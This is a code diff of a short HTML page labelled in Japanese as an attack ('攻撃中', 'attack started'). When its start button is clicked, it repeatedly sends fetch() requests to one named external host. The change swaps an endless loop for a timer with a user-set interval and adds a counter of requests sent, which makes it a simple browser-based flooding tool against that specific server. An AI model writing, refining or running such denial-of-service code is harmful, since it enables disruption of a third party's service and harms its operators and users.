@@ -10,19 +10,20 @@
 <body>
   <h1 id="i">攻撃中</h1>
   <button id="s">開始</button>
-  <!--<h3 id="c"></h3>-->
+  <input type="text" id="in">
+  <h3 id="c"></h3>
 </body>
 <script>
-  let n = 1
   document.getElementById('s').onclick = function() {
+    let n = 0
     document.getElementById('i').innerHTML = '攻撃開始'
-    while (n > 0) {
-    try {
-    fetch('https://gp-uuc4.iss.netstar-inc.com');
-    } catch (e) {}
-    //document.getElementById('c').innerHTML = n;
-    //n++
-    }
+    setInterval(function() {
+      try {
+        fetch('https://gp-uuc4.iss.netstar-inc.com');
+      } catch (e) {}
+      document.getElementById('c').innerHTML = n;
+      n++
+    }, document.getElementById('in').value)
   }
 </script>
 </html>
